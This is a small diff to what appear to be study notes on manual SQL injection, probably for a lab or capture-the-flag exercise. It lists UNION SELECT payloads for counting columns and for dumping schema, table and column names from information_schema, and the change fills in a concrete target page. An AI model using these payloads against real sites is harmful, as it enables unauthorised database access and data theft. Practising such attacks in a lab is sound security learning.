@@ -97,7 +97,8 @@ Step 1-Idenitfy Vulnerable Field/Selection
 Step 2- Identify the Number of Columns/Server Side Selections
 <field>' UNION SELECT 1,2,3,4 #
 Step 3 - Modify Golden Statement
-<feild>' UNION SELECT table_schema,2,table_name,column_name, 4 from information_schema.columns #
+</pick.php?product=7>' UNION SELECT table_schema,2,table_name,column_name, 4 from information_schema.columns #
+(^ensure you have selected an actual option before putting golden statement)
 Step 4 - Craft Queries
 <feild>' UNION SELECT 
 
